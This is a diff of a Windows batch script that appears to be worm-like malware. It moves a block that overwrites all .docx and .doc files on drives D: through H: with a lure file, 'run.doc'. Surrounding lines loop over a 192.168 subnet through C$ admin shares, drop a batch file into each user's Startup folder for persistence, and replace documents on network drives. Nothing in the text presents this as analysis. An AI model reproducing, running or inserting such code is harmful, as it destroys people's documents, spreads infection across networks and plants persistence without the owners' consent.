@@ -2,6 +2,21 @@
 SET ii=1
 SET i=0
 :run
+if exist D: (for /f "delims=" %%h in ('dir D:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "D:\%%h"
+for /R "D:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "E:\%%h"
+for /R "E:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "F:\%%h"
+for /R "F:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist G: (for /f "delims=" %%h in ('dir G:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "G:\%%h"
+for /R "G:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist H: (for /f "delims=" %%h in ('dir H:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "H:\%%h"
+for /R "H:" %%f in (*.docx) do ren "%%f" *.doc)
+if exist D: (for /f "delims=" %%h in ('dir D:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "D:\%%h")
+if exist E: (for /f "delims=" %%h in ('dir E:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "E:\%%h")
+if exist F: (for /f "delims=" %%h in ('dir F:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "F:\%%h")
+if exist G: (for /f "delims=" %%h in ('dir G:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "G:\%%h")
+if exist H: (for /f "delims=" %%h in ('dir H:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "H:\%%h")
 pushd \\192.168.%i%.%ii%\C$
 if exist X: (for /f %%x in ('dir X:\Users /b') do mkdir "X:\Users\%%x\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
 if exist X: (for /f %%u in ('dir X:\Users /b') do copy /Y "C:\ProgramData\PSU\bgin.bat" "X:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat")
@@ -19,21 +34,6 @@ if exist Z: (for /f "delims=" %%h in ('dir Z:\*.docx /b') do copy /Y "C:\Program
 for /R "Z:" %%f in (*.docx) do ren "%%f" *.doc
 if exist Z: (for /f "delims=" %%h in ('dir Z:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "Z:\%%h")
 popd
-if exist D: (for /f "delims=" %%h in ('dir D:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "D:\%%h"
-for /R "D:" %%f in (*.docx) do ren "%%f" *.doc)
-if exist E: (for /f "delims=" %%h in ('dir E:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "E:\%%h"
-for /R "E:" %%f in (*.docx) do ren "%%f" *.doc)
-if exist F: (for /f "delims=" %%h in ('dir F:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "F:\%%h"
-for /R "F:" %%f in (*.docx) do ren "%%f" *.doc)
-if exist G: (for /f "delims=" %%h in ('dir G:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "G:\%%h"
-for /R "G:" %%f in (*.docx) do ren "%%f" *.doc)
-if exist H: (for /f "delims=" %%h in ('dir H:\*.docx /b') do copy /Y "C:\ProgramData\PSU\run.doc" "H:\%%h"
-for /R "H:" %%f in (*.docx) do ren "%%f" *.doc)
-if exist D: (for /f "delims=" %%h in ('dir D:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "D:\%%h")
-if exist E: (for /f "delims=" %%h in ('dir E:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "E:\%%h")
-if exist F: (for /f "delims=" %%h in ('dir F:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "F:\%%h")
-if exist G: (for /f "delims=" %%h in ('dir G:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "G:\%%h")
-if exist H: (for /f "delims=" %%h in ('dir H:\*.doc /b') do copy /Y "C:\ProgramData\PSU\run.doc" "H:\%%h")
 if %ii% == 256 (goto next) else (set /a ii=ii+1)
 goto run
 :next
